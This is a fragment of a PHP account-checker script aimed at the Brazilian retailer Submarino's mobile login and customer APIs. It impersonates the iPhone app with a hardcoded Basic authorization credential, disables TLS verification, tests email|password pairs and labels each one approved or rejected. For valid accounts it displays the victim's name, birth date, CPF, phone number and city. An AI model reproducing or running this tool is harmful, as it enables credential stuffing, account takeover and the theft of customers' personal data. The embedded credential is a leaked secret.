...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://customer-token-v1-submarino.b2w.io/customer-token'); 
...
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY(
  'Host: customer-token-v1-submarino.b2w.io',
  'Content-Type: application/vnd.login.b2w+json',
  'Accept: */*',
  'Accept-Encoding: gzip, deflate',
  'Connection: close',
  'X-NewRelic-ID: UgEAU1NQGwEFVllQDwQG',
  'User-Agent: Submarino/4.138 (iPhone; iOS 12.5.4; Scale/2.00)',
  'Accept-Language: pt-BR;q=1',
  'Authorization: Basic YXBwaW9zc3ViYTo5emMzVmlZ',
	));
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.submarino.com.br/api/v6/customer/'.$customer.'?persist=true');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://sacola.submarino.com.br/api/v6/customer/'.$customer.'/address?limit=40&persist=true');  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
...
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  ...
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$fullName.' | Data: '.$birthday.' | CPF: '.$cpf.' | Telefone: '.$ddd.''.$number.' | Cidade: '.$city.'('.$state.') Status: '.$status.' <strong></strong></p>
                                  </div>
...
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  ...
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' → Retorno: '.$d1.' <strong> </strong></p>
                                  </div>
